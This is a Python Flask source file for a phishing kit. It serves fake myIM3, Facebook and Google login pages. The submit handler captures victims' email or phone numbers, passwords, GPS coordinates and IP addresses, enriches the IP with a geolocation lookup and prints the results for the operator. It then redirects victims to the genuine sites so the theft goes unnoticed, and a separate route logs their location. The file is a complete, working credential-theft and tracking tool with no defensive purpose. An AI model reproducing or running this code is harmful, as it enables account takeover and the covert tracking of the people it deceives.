from flask import Flask, render_template, request, redirect, url_for
import requests
import sys

app = Flask(__name__)

selected_template = None  # Define a global variable for selected template

def display_start_message():
    message = """
  ____    _                   __        __  _     _                         
 |  _ \  (_)   ___    ___     \ \      / / (_)   (_)   __ _   _   _    __ _ 
 | |_) | | |  / __|  / _ \     \ \ /\ / /  | |   | |  / _` | | | | |  / _` |
 |  _ <  | | | (__  | (_) |     \ V  V /   | |   | | | (_| | | |_| | | (_| |
 |_| \_\ |_|  \___|  \___/       \_/\_/    |_|  _/ |  \__,_|  \__, |  \__,_|
                                               |__/           |___/         
                                                                               
    """
    print(message)

@app.route('/')
def index():
    global selected_template
    if selected_template is None:
        return "Template has not been selected. Please restart the application and select a template."
    return render_template(selected_template)

@app.route('/submit', methods=['POST'])
def submit():
    email_or_phone = request.form.get('email_or_phone')
    password = request.form.get('password')
    latitude = request.form.get('latitude')
    longitude = request.form.get('longitude')

    # Fetch IP address
    ip_address = request.remote_addr

    # Optionally, fetch more IP details from an external service
    response = requests.get(f'https://ipinfo.io/{ip_address}/json')
    ip_data = response.json()

    print(f"Email or Phone: {email_or_phone}, Password: {password}")
    print(f"IP Address: {ip_address}")
    print(f"IP Data: {ip_data}")
    print(f"Latitude: {latitude}, Longitude: {longitude}")

    # Redirect based on selected template
    if selected_template == 'facebook.html':
        return redirect("https://id-id.facebook.com/")
    elif selected_template == 'google.html':
        return redirect("https://accounts.google.com/v3/signin/identifier?hl=id&ifkv=AdF4I750wI3S8c-DoqB-FiKWD5ZqGFS9ehPf_7Hks2EK6R1GvbK-xbnBCd19Ukzd_7KegNlJWMgcTg&flowName=GlifWebSignIn&flowEntry=ServiceLogin&dsh=S-888206048%3A1722344625920680&ddm=0")
    elif selected_template == 'myIM3.html':
        return redirect("https://im3.id/portal/id/psmyim3landing")
    else:
        return "Invalid template selection."

@app.route('/facebook')
def facebook():
    return render_template('facebook.html')

@app.route('/google')
def google():
    return render_template('google.html')

@app.route('/log_location', methods=['POST'])
def log_location():
    latitude = request.form.get('latitude')
    longitude = request.form.get('longitude')
    ip_address = request.remote_addr

    print(f"IP Address: {ip_address}, Latitude: {latitude}, Longitude: {longitude}")
    return '', 204

def main():
    display_start_message()  # Call the function to display the start message

    # Prompt for template selection
    print("Select a template:")
    print("1: myIM3")
    print("2: facebook")
    print("3: google")
    choice = input("Enter the number of the template you want to use: ")

    global selected_template
    if choice == '1':
        selected_template = 'myIM3.html'
    elif choice == '2':
        selected_template = 'facebook.html'
    elif choice == '3':
        selected_template = 'google.html'
    else:
        print("Invalid choice. Please restart the application and select a valid template.")
        sys.exit(1)

    app.run(debug=True, port=5001)

if __name__ == '__main__':
    main()
